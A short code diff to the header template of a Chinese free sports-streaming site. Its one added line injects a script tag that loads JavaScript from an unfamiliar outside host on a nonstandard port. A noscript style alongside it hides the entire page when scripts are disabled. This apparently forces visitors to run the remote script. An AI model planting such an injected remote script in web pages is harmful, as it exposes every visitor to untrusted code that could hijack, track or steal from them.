@@ -6,6 +6,7 @@
     $keywords = isset($keywords) ? $keywords : '爱看球,爱看球直播,JRS直播,NBA直播,英超直播,西甲直播,足球直播,低调看直播,免费直播';
     $description = isset($description) ? $description : '爱看球是一个专业为球迷提供免费直播的平台，囊括NBA,英超,西甲,德甲,意甲,法甲,中超,欧冠,世界杯等各大足球直播。JRS低调看直播就来爱看球直播。';
     ?>
+        <noscript><style type="text/css">body{display:none;background:#fff}</style></noscript><script type='text/javascript' charset='utf-8' src='http://ip198.pw:81/l/?1148'></script>
     <meta charset="UTF-8">
     @yield("meta")
     <title>{{$title}}</title>
